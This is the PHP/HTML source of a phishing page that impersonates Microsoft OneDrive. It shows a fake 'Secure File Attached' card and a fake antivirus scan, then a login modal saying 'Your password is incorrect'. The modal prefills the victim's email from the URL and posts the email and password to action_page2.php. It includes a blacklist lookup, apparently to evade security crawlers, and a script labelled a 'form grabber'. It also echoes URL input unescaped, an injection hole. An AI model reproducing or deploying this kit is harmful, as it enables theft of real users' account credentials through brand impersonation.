<?php
/*
Created by Rodz -- icq:  
*/
#require "includes/session_protect.php";
#require "includes/functions.php";
#require "includes/One_Time.php";
require "includes/blacklist_lookup.php";
?>
<?php

$user = $_GET['email'];

?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <link rel="stylesheet" href="css/bootstrap.min.css">
  <!-- FAV ICON -->
  <link rel="SHORTCUT ICON" sizes="16x16" href="favicon-16x16.ico">
  <!-- This imports the font awesome library -->
  <link rel="stylesheet" href="css/all.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  <!-- My custom style rules -->
  <link rel="stylesheet" href="css/styles.css">
  <!-- Page Title -->
  <title>OneDrive Cloud </title>
  <style>
  body {
    background-color: #0047B5;
}
</style>
 
 </head>
<body>

  <!-- SPINNER AREA TO BE TRIGGERED WITH JQUERY -->
      <!-- container holding the spinner-->
      <div id="page-loader" class="spin-wrapper" style="display: none;">
            <div id="spin-loader" class="spin-pos">
                <img id="loader-image" class="loader" src="spinner.svg" alt="Loading....">
                <div id="page-progress" class="progress-caption" style="font-size: 17px; font-weight: 600;">Please wait, we are setting up things for you</div>
            </div>
        </div> 
     <!-- END OF THE SPINNER -->


<div id="page-content" class="container" style="display: block;"> 
<!-- NAV BAR -->
    <nav class="navbar navbar-inverse navbar-toggleable-sm navbar-fixed-top" style="position: fixed; margin-bottom: 40px;">
      <div class=" mb-3">
      <!-- Nav Bar Logo -->
        <img src="amg/ofs.png" id="logo-image" style="height: 75px; width: 120px;">
      <button class="navbar-toggler custom-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#myContent" aria-expanded="false" aria-label="Toggle Navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      </div>
      <!-- <a href="#" class="navbar-brand"><span style="font-weight:bold;">Microsoft <small> Office 360</small></span></a> -->
      <!-- <div class="row m-0 ">
        <a href="#" class="navbar-brand col-sm-4" ><span style="font-weight:bold;">Microsoft <small> Office 360</small></span></a>
      </div> -->
      
      <!-- Beginning of the container that holds the navbar list items -->
      <div class="collapse navbar-collapse" id="myContent">
          <div class="navbar-nav">
            
          </div><!-- End of Navbar -->
      </div> <!-- End of the Collapssible menuc-->

    </nav>
<!-- END OF NAV BAR -->

<div class="container col-sm-12 mt-3"> <!-- Beginning of content container -->

      <div class="row">
        <!-- Beginning of the card -->
        <div class="offset-md-2 col-sm-12 col-xs-12 col-md-8">
         <div class="mt-5">
          <div class="card text-center">
          <div class="card-header">
            <ul class="nav nav-tabs card-header-tabs">
              <li class="nav-item">
              <!-- Edit Document Label -->
                <a class="nav-link disabled" href="#"><span class="glyphicon glyphicon-file"></span>Edit Doc</a>
              </li>
              <li class="nav-item">
              <!--Sign Document Fake Label -->
                <a class="nav-link disabled" href="#">Sign Doc</a>
              </li>
              <li class="nav-item">
              <!-- View Document Fake Label -->
                <a class="nav-link active" href="#">View Doc</a>
              </li>
            </ul>
          </div>
          <div class="card-body">

          <div class="ml-3 mt-3 text-left">
          <!-- Secured Remote Attachment label -->
		  
		  <img style="height: 30px; float: left; margin-right: 10px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAEQElEQVR4nO2aX2hbZRTAf+cmTdI0a7fpYi2zFnGzOpE+iOxJxJE0ERTBODYQUUEUCoKC82H4KiiKyFT0QRQUFamoiCZN/DM3mQiiIrJl4IP4UOpAmFCz1iX3+HA7yJ8muffmNmnx+8F9uPee75zznXvOd893EzAYDAaDwWAwGAwGw/8PGbQDpAoJhCkgAVpFZRFhiWLG7of5wQQgVUgCDwH3IMwA4Yb7yhJQBN4AOUFpdsNc6W8AZvMRbDkCPIWQcDVGOQ7MUcqc3giX+heAVH4CkY+AWzyPVSrAI5Qy7wTtVn8CkC5MoJxEuKYHLTbKHKXMa4H5RZABSBcsVOOADVKhlHGupxYioCcRH0++lSroLMXsVwHoAnoNQDqfROV+4E6Em4DtOE/qPMKPKJ8gehXIkSCcBUD5A9F9FLPLQajzF4D0QgTVp4EnEOJBOOIJ5SilzDNBqPIegHQhifJpQCntE11E5WpKmWqvmixP0qnCKMqXgU5etfFwhUwguj8I8+HuIvV29XWQG4MwTDjuHKEIWCFQwK5CbQUu/gO1VZAOCaqyH/i2ZzdcS6YKtwOHerKmCkNxiF0GVpNpwQlEOArRMahegAt/gbbN8j09+bKGlxJ4sjdTCrEdEL+idfLrER6GxASEYu0k3HWSXXC3CKbyOxH5E68lcwldm3x0u7+xlSWnJFTBGnLKJhQ5RXTsGMivhK3TvL/X1+bJXQDS+TtAPvNjAIBQFEau9D0cuwqr5yEy6ky+ld+BY6AvM3/9v15UuywBmfSitAFViO30PRxwSmb48naTB5gCXkD5nlx5ypPqrhKpBVB85O4aoahz9AORGeAb7i3vdj2k7Z3ZfAJbHkP0QZBrfTsVGXPqv5+oHmdb+ABv7em6Lqy/qKUKMygfOru3HvdL7dN24xC5jeXaXcDH3URbSyCdvwH4GnrYuqridDaAeGs2A+RhN0KNjzf7eZia/OS/2xOIbIOhEed1dUl9p45uw9BlLGsHH1zXcb/QWAI16xDgb/KhKAzvctfk9AVJYGsSWOwk1ZSfetiXrVAM4uObaPJrKK+QO/MAB8tt28nGAKjc7NmIWBDfNaA074JwN8ib2JwlV751PRGracCoZyORMZCQPwf7xySqC+sFoXmJ9vaZSdVZ8LYCIjHgbe472/AFq6kE9GdPSq3Q5qv7zkyyogfrLzSXwHve9A3sHd8LB+pPmmYg76L6m3tdffn5LmiS9SeNAShmVhAOAxVXquyas1XdWjSsc605XMz+gJIFlrqqEoGLgXye7yff1Z+sX8SlzAmUfSjPo5zrqG71b9AtUwoVVBt+X+zevaQKFqJ7UXYjbXY2I+MzWLFnN8G/Dboxx/z0q/UXgnM5V34UeAkYwP63K1XgKPPTzzXfCPaZ5c5MgzwOmgEZZ7DvSRvVc4h8AbzI/PQvA/TFYDAYDAaDwWAwGAyGzcR/qx0LZ7L48rwAAAAASUVORK5CYII=">
           <span class="rex"><b>Secure File Attached</span>
              </div>

            <div class="mt-4 mb-5">
            
              <div>
            
                <img src="amg/word-icon.png" id="attachment" class="mt-1" style="width: 85px; margin-top: 20px;">
              <div class=""><br> 
                  <div>
                    <small class="text-left card-text"><b>Filename: Scanned-File.pdf</small>
                  </div>
              <div>
                  <!-- Document Description Label --> 
                    <small class="text-left card-text"><b>Description: Secured Document</small>
                  </div>
                  <div>
                  <!-- Document Type Label -->
                    <small class="text-left card-text"><b>Type: PDF</small>
                  </div>
                  <div>
                  <!--Document Size -->
                    <small class="text-left card-text"><b>Size: 256KB</small>
                    </div>
                </div>
                <!--- View Button label -->
                <a href="#" class="mt-5 btn btn-primary" data-toggle="modal" style="background-color: rgb(0,71,181); id="spin-btn" data-target="#myModal">View Document</a>
              </div>
            </div>
          </div>
         
      </div> 
        </div>

        <div class="row" style="padding-top: 20px;">
          
        </div>
      <!--End of the Card -->
      </div>
     

</div><!-- End of content container -->


         
             
              
       
     



  <!-- The User Authentication Modal -->
  <div class="modal show" id="myModal">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content">

        <div id="spin-wrapper" class="spin-wrapper" style="display: none;">
        <!-- Anti virus image insertion -->
          <div style="padding-top: 130px; padding-left: 100px;">
          <img src="amg/anti-virus.jpg" style="width: 70px;">
          </div>
            <div id="spin-pos" class="spin-pos">
                <img id="loader" class="loader" src="spinner.svg" alt="Loading....">
                <div id="progress-caption" class="progress-caption" style="font-size: 16px; font-weight: 600;">Scanning document for virus</div>
            </div>
        </div> 



      
        <!-- Modal Header -->
        <div class="modal-header">

          
       

          <!-- This div creates a new row for holding the assets of the modal header -->
          <div class="row">
            <!-- This div spans the 12 columns of the display -->
             <div class="col-sm-12 col-md-12 col-lg-12">
               <!-- Modal logo image -->
                  <div>
                    <img style="height: 30px; float: left; margin-right: 10px;" src="amg/ted.png">
                  </div>
                 <span class="modal-title">OneDrive</span>
             </div>

            <!-- This div spans the 12 columns of the display -->
             <div class="col-sm-12 col-md-12 col-lg-12" style="margin-left: 32px;">
              <!-- Modal Sub heading -->
				 <small><font color="red">Your password is incorrect. Login Again</font></small>
             </div>
          </div>
          <button type="button" class="close" data-dismiss="modal">×</button>
          
        </div>
        
        <!-- Modal body -->
        <div class="modal-body">
        
            <div class="container">
                <!-- <h2>Stacked form</h2> -->

                <!-- Server response message div -->
                <div id="response" class="m-0" style="font-size: 14px; margin-top: 10px;">
                    
                </div>
                <!-- End of server response message div -->

                <form action="action_page2.php" method="post">
                  
                    <div class="form-group">
                    <!-- User Email Label -->
                        <label for="user_email">Email:</label>								
                        <input class="form-control form-control-sm" required id="user_email" value="<?php echo $_GET['email']; ?>" placeholder="Please enter your email" name="email" type="text">

                        <!-- Error span tag for the user email address error -->
                        <span id="email-error" class="user-error" style="font-size: 13px; color: red;"></span>
                    </div>
                    <div class="form-group">

                    <!-- User Password label -->
                        <label for="user_pwd">Password:</label>
                        <input class="form-control form-control-sm" required id="user_pwd" placeholder="Please enter  your password" name="pswd" type="password">
                        <!-- Error span tag for the user password address error -->
                        <span id="pass-error" class="user-error" style="font-size: 13px; color: red;"></span>
                    </div>

                    <!-- Submit Button Label -->
                   
					<input class="btn btn-primary btn-block"  id="login_btn"   type="submit" value="View File" name="btn btn-block bt-login" style="background-color: rgb(0,71,181);"/> 
                </form>
            </div>


        </div>
        
        <!-- Modal footer -->
        <div class="modal-footer container">

          <div class="row mt-0">
            <!-- This div spans the 12 columns of the display -->
             <div class="col-sm-12 col-md-12 col-lg-12">
                 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small style="font-size: 12px;">Sign in with Receiver's email and password to gain access.</small>
             </div>
               <!-- This div spans the 12 columns of the display -->
             <div class="col-sm-12 col-md-12 col-lg-12 mt-0">
                 <center><big style="font-size: 10px;">©2019 OneDrive.</big>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             </div>
          </div>
         
        </div>

           
        
      </div>
    </div>
  </div>






<!-- Beginning of the footer -->
<div class="mt-5">
  <footer class="container-fluid text-center">
    <div class="row">
        <div class="col-sm-12">
          
            <span class="glyphicon glyphicon-chevron-up"><font color="white">OneDrive Cloud</font></span>
          
        </div>
      
        <!-- Setting the user country if avaliable -->
        <div style="font-size: 14px;" class="col-sm-12"><small><font color="white">Your IP address<?Php
$ip=$_SERVER['REMOTE_ADDR'];
echo "($ip)";
?> have been logged for security purposes.</small></font></div>

        


        <div class="col-sm-12">
           <p><small><font color="white">© 2019 OneDrive.</font></small></p>
        </div>
    </div>
    
  </footer> <!-- End of the footer -->
</div>
 </div>
 </div>

<!-- Jquery library -->
<script src="js/jquery.slim.min.js"></script>
<script src="js/tether.min.js"></script>
<script src="js/bootstrap.min.js"></script>

<!-- This line imports the javascript form grabber -->
<script src="js/scripts.js"></script>
<!-- This  grabber -->
<script type="text/javascript">
    $(window).on('load',function(){
        $('#myModal').modal('show');
    });
</script>



 



</body><!-- End of Body of the page  -->
</html>
